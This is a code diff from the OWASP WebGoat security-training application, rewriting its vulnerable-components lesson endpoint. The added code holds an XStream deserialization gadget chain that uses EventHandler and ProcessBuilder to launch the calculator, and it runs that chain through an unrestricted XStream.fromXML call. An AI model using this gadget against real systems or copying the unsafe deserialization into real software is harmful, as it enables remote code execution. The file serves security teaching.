@@ -1,18 +1,17 @@
 package org.owasp.webgoat.plugin;
 
-import org.owasp.webgoat.endpoints.AssignmentEndpoint;
-import org.owasp.webgoat.endpoints.AssignmentHints;
-import org.owasp.webgoat.endpoints.AssignmentPath;
-import org.owasp.webgoat.lessons.AttackResult;
+import java.io.IOException;
+
+import javax.servlet.http.HttpServletRequest;
+
+import org.owasp.webgoat.assignments.AssignmentEndpoint;
+import org.owasp.webgoat.assignments.AssignmentPath;
+import org.owasp.webgoat.assignments.AttackResult;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
-
-import javax.servlet.http.HttpServletRequest;
-import javax.ws.rs.Path;
-
-import java.io.IOException;
+import com.thoughtworks.xstream.XStream;
 
 /**
  * *************************************************************************************************
@@ -52,11 +51,35 @@ import java.io.IOException;
 public class VulnerableComponentsLesson extends AssignmentEndpoint {
 
 	@RequestMapping(method = RequestMethod.POST)
-	public @ResponseBody AttackResult completed(@RequestParam String person, HttpServletRequest request) throws IOException {
-	    if (!person.toString().equals("")) {
-	        return trackProgress(AttackResult.success("The server has reversed your name: " + new StringBuffer(person).reverse().toString()));
-	    } else {
-	        return trackProgress(AttackResult.failed("You are close, try again"));
-	    }
+	public @ResponseBody AttackResult completed(@RequestParam String payload) throws IOException {
+		String process = "open"; 		
+		String arguments = "/Applications/Calculator.app";		
+		
+		String payload2 = "<sorted-set>" +  
+						 "<string>foo</string>" +
+						 "<dynamic-proxy>" + 
+						 "<interface>java.lang.Comparable</interface>" +
+						 "<handler class=\"java.beans.EventHandler\">" +
+						 "    <target class=\"java.lang.ProcessBuilder\">" +
+						 "         <command>" +
+						 "             <string>" + process + "</string>" +
+						 "             <string>" + arguments + "</string>" +
+						 "        </command>" +
+						 "    </target>" +
+						 "    <action>start</action>" +
+						 "</handler>" + 
+						 "</dynamic-proxy>" + 						
+						"</sorted-set>";
+		XStream xstream = new XStream();
+		String xml = (String)xstream.fromXML(payload2);
+       if (!payload.toString().equals("")) {
+            return trackProgress(success()
+                .feedback("vulnerable-components")
+                .feedbackArgs(xml)
+                .build());
+        } else {
+            return trackProgress(failed().feedback("vulnerable-components.close").build());
+        }
+
 	}
 }
